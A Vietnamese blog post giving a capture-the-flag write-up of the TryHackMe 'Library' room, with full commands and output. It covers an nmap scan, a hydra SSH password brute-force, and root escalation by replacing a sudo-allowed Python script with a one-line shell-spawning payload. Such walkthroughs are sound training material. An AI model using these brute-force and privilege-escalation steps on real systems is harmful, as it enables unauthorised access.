---
layout: post
author: "Neo"
title: "Tryhackme - Library"
date: "2022-03-15"
tags: [
    "tryhackme",
    "web",
    "linux",
    "hydra",
    "brute-force",
    "python",
    "ssh",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-03-15-THM-Library.webp)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | Library](https://tryhackme.com/room/bsidesgtlibrary)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở trên máy chủ mục tiêu

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c42fc34767063204ef92918e0587d5dc (RSA)
|   256 689213ec9479dcbb7702da99bfb69db0 (ECDSA)
|_  256 43e824fcd8b8d3aac248089751dc5b7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Xem qua web với port 80 

Tôi có 1 cái tên ở đây *meliodas*. Khi scan port phía trên tôi cũng có 1 path là *robots.txt*

Ngay khi nhìn thấy rockyou thì tôi nghĩ ngay đến brute-force (thực ra thì ai cũng nghĩ đến thôi). Tôi sẽ thử brute-force với username *meliodas* 

```python
┌──(neo㉿kali)-[~/THM-Library]
└─$ hydra -l meliodas -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt ssh://10.10.192.105
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-04 04:33:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 42660 login tries (l:1/p:42660), ~2667 tries per task
[DATA] attacking ssh://10.10.192.105:22/
[STATUS] 128.00 tries/min, 128 tries in 00:01h, 42534 to do in 05:33h, 14 active
[22][ssh] host: 10.10.192.105   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-04 04:35:35
```

Thử login ssh 

```python
┌──(neo㉿kali)-[~/THM-Library]
└─$ ssh meliodas@10.10.192.105                                                                            
The authenticity of host '10.10.192.105 (10.10.192.105)' can't be established.
ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.192.105' (ED25519) to the list of known hosts.
meliodas@10.10.192.105's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ 
```

## Privilege escalation

`sudo -l`

```python
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ 
```

`cat bak.py`

```python
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
meliodas@ubuntu:~$
```

Do file này sở hữu bởi *root* nên tôi không có quyền sửa file này. Tôi sẽ xóa nó đi và tạo 1 file bak.py khác chưa payload python để leo quyền.

```python
meliodas@ubuntu:~$ rm /home/meliodas/bak.py
meliodas@ubuntu:~$ echo 'import os;os.system("/bin/bash")' > /home/meliodas/bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
root@ubuntu:~# 
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# ls /root/
root.txt
root@ubuntu:~# 
```
